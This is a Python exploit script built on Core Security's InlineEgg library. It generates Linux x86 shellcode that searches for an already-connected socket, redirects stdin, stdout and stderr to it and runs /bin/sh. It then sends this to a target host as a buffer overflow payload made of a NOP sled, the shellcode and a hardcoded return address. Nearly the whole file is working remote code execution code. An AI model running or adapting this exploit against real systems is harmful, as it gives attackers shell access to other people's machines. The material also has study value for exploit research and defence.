#!/usr/bin/python
#--
# Copyright (c) 2002,2003 Core Security Technologies, Core SDI Inc.
# All rights reserved.
#
#    Unless you have express writen permission from the Copyright Holder, any
# use of or distribution of this software or portions of it, including, but not
# limited to, reimplementations, modifications and derived work of it, in
# either source code or any other form, as well as any other software using or
# referencing it in any way, may NOT be sold for commercial gain, must be
# covered by this very same license, and must retain this copyright notice and
# this license.
#    Neither the name of the Copyright Holder nor the names of its contributors
# may be used to endorse or promote products derived from this software
# without specific prior written permission.
#
# THERE IS NO WARRANTY FOR THE SOFTWARE, TO THE EXTENT PERMITTED BY APPLICABLE
# LAW. EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR
# OTHER PARTIES PROVIDE THE SOFTWARE "AS IS" WITHOUT WARRANTY OF ANY KIND,
# EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE. THE
# ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE SOFTWARE IS WITH YOU.
# SHOULD THE SOFTWARE PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY
# SERVICING, REPAIR OR CORRECTION.
#
# IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING WILL
# ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MAY MODIFY AND/OR REDISTRIBUTE
# THE SOFTWARE AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY
# GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE USE
# OR INABILITY TO USE THE SOFTWARE (INCLUDING BUT NOT LIMITED TO LOSS OF DATA OR
# DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD PARTIES OR
# A FAILURE OF THE SOFTWARE TO OPERATE WITH ANY OTHER SOFTWARE), EVEN IF SUCH
# HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.
#
# gera [at corest.com]
#--

from inlineegg.inlineegg import *
import socket
import struct
import sys

def reuseConnectionShellEgg():
#   egg = InlineEgg(FreeBSDx86Syscall)
#   egg = InlineEgg(OpenBSDx86Syscall)
   egg = InlineEgg(Linuxx86Syscall)
     
   # s = egg.socket(2,1)                # uncomment for testing
   # egg.connect(s,('127.0.0.1',3334))

   # scan for correct socket
   sock = egg.save(-1)                # create a variable in the stack, initialized with zero

   # loop looking for socket
   loop = egg.Do()                    # we're gonna do a "do {} while()"
   loop.addCode(loop.micro.inc(sock)) # now we talk to the answer from Do(), look how we use anEgg.micro and addCode()
   lenp = loop.save(0)                # while coding the loop, we need to talk to "loop" no "egg"
   err = loop.getpeername(sock,0,lenp.addr())
   loop.While(err, '!=', 0)

   # NOTE: in linux and openbsd (at least), if the passed length to getpeername() is 0
   # there is no need to pass valid pointer, however the length must be a valid pointer itself.
   # If you wanted to pass a buffer to compare peer's address to some value you could do:
   #
   # foundIP = egg.Do()                                       # outer loop for IP address
   #
   # loop = egg.Do()                                          # inner loop for return value from getpeername()
   # buff = loop.alloc(16)                                    # allocate a 16 bytes buffer (in the stack)
   # lenp = loop.save(16)                                     # initialize the length with 16 (the size of the buffer)
   # err  = loop.getpeername(sock, buff.addr(), lenp.addr())
   # loop.addCode(loop.micro.set('edx',buff+4))               # save peers IP address in 'edx'
   # loop.While(err, '!=', 0)
   #
   # foundIP.While('edx','!=',0x0100007f)

   # dup an exec
   egg.dup2(sock, 0)
   egg.dup2(sock, 1)
   egg.dup2(sock, 2)
   egg.execve('/bin/sh',('bash','-i'))
   print "Egg len: %d" % len(egg)
   return egg


def main():
   if len(sys.argv) < 3:
      raise Exception, "Usage: %s <target ip> <target port>"

   # connect to target
   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   sock.connect((sys.argv[1], int(sys.argv[2])))

   # create egg
   egg = reuseConnectionShellEgg()

   # exploit

   retAddr = struct.pack('<L',0xbffffc24L)
   toSend  = "\x90"*(1024-len(egg))
   toSend += egg.getCode()
   toSend += retAddr*20

   sock.send(toSend)

main()
